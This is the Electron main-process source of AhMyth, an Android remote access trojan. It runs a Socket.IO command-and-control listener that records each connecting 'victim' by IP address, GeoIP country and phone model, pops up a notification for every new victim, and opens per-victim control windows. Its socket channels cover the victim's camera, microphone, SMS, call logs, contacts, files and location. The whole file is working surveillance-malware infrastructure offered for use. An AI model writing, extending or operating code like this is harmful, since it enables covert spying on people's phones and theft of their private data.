const { app, BrowserWindow, dialog, screen } = require('electron');
const { ipcMain } = require('electron');
const { initialize, enable } = require('@electron/remote/main');
const { nativeTheme } = require('electron/main');
const victimsList = require('./app/assets/js/model/Victim');
var io = require('socket.io');
var geoip = require('geoip-lite2');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
//--------------------------------------------------------------

initialize();

function createWindow() {

  // get Display Sizes ( x , y , width , height)
  display = screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  // load splash file
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); // Show splash screen

    // 32bit Arch Check and deprecation message
    setTimeout(() => {
      const architecture = process.arch;
      if (architecture === 'ia32') {
        // If not 64-bit architecture, show message box
        dialog.showMessageBoxSync(splashWin, {
          type: 'info',
          title: 'Architecture Check',
          message: 'AhMyth will soon be dropping support for Operating Systems running 32bit Architecture, sorry for any inconvenience.',
          buttons: ['OK']
        });
      }
    }, 500); // Adjust the delay as needed
  });

  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })

  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 900,
    height: 690,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
    }
  });

  win.loadFile(__dirname + '/app/index.html');

  enable(win.webContents);

  win.webContents.openDevTools();

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  });

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close(); // Close splash screen
      win.show(); // Show main UI
    }, 2000);
  });
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow);

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
});

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
});

// handle the dark mode toggle
ipcMain.handle('dark-mode:toggle', () => {
  if (nativeTheme.shouldUseDarkColors) {
    nativeTheme.themeSource = 'light'
  } else {
    nativeTheme.themeSource = 'dark'
  }
  return nativeTheme.shouldUseDarkColors
})

ipcMain.handle('dark-mode:system', () => {
  nativeTheme.themeSource = 'system'
})

//handle the Uncaught Exceptions

// Function to check if the extracted victim IP is private or public
function isPrivateIP(ip) {
  return /^10\./.test(ip) ||
    /^192\.168\./.test(ip) ||
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
}

// Global Object to track listening status for each port
const listeningStatus = {};

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;

    // Extract IP address of the connected victim(s) + handle both IPv4 and IPv6 formats
    var ip = address.remoteAddress;
    if (ip.includes(':')) {
      ip = ip.substring(ip.lastIndexOf(':') + 1);
    }

    /* Set the counry as null for every connection
    before obtaining the country of origin based on the victim's IP 
    to avoid conflictions */
    var country = null;

    // check if the extracted victim IP from an active connection is Private or Public
    if (isPrivateIP(ip)) {

      // If the IP is Private
      const warningMessage = `[!] IP ${ip} is a private IP address! Private IP addresses cannot be Geolocated, skipping GeoIP lookup.`;
      event.reply('SocketIO:GeoIPError', warningMessage);
      event.sender.send('SocketIO:Log', warningMessage);
    } else {

      // if the IP is public 
      // Check the IP location
      var geo = geoip.lookup(ip);

      // handle exceptions
      if (geo) {
        if (geo.country) {
          country = geo.country.toLowerCase();
        } else {
          const warningMessage = `[!] GeoIP lookup returned no country for IP: ${ip}, Unable to determine the Victim's Country.`;
          event.reply('SocketIO:GeoIPError', warningMessage);
          event.sender.send('SocketIO:Log', warningMessage);
        }
      } else {
        const warningMessage = `[!] GeoIP lookup failed for IP: ${ip}, Unable to determine the Victim's Country.`;
        event.reply('SocketIO:GeoIPError', warningMessage);
        event.sender.send('SocketIO:Log', warningMessage);
      }
    }

    // Add the victim to victimList
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

    //------------------------Notification SCREEN INIT------------------------------------
    // create the Notification window
    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true,
        contextIsolation: false,
      }
    });

    // Emitted when the window is finished loading.
    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () {
        notification.destroy()
      }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadFile(__dirname + '/app/notification.html');

    enable(notification.webContents);

    // notify renderer process (AppCtrl) about the new Victim
    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      // Check if the disconnection was server-initiated
      const isServerInitiated = IOs[port].sockets.serverInitiatedDisconnect;

      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      // notify renderer process (AppCtrl) about the server disconnecting from the Victim
      if (isServerInitiated) {
        win.webContents.send('SocketIO:StopAndRemoveVictim', index);
        IOs[port].sockets.serverInitiatedDisconnect = false; // reset the flag
      } else {
        // motify the render process (AppCtrl) about the Victim Disconnecting
        win.webContents.send('SocketIO:RemoveVictim', index);
      }

      if (windows[index]) {
        if (isServerInitiated) {
          // notify renderer process (LabCtrl) if opened about the Stop Button being clicked 
          // effectively disconnecting the server from the client 
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerTerminated");

          // delete the window from the windowsList
          delete windows[index]
        } else {
          // notify renderer process (LabCtrl) if opened about the disconnected Victim
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");

          // delete the window from windowsList
          delete windows[index]
        };
      };
    });
  });

  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
  listeningStatus[port] = true; // Update listening status for the specific port
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    const sockets = IOs[port].sockets.sockets;
    const hasActiveConnections = Object.keys(sockets).length > 0;

    // Set the flag to indicate server-initiated disconnection if there are active connections
    if (hasActiveConnections) {
      IOs[port].sockets.serverInitiatedDisconnect = true;
    }

    IOs[port].close();
    IOs[port] = null;

    if (hasActiveConnections) {
      win.webContents.send('SocketIO:ServerDisconnectMessage');
    } else {
      event.reply('SocketIO:Stop', '[✓] Stopped Listening on Port: ' + port);
    }

    listeningStatus[port] = false; // Update listening status for the specific port
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

process.on('uncaughtException', function (error) {
  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:ListenError', "Address Already in Use");
  } else {
    dialog.showErrorBox("ERROR", JSON.stringify(error));
    console.log(error);
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 700,
    height: 690,
    show: false,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
    }
  })

  //add this window to windowsList
  windows[index] = child.id;

  enable(child.webContents);
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});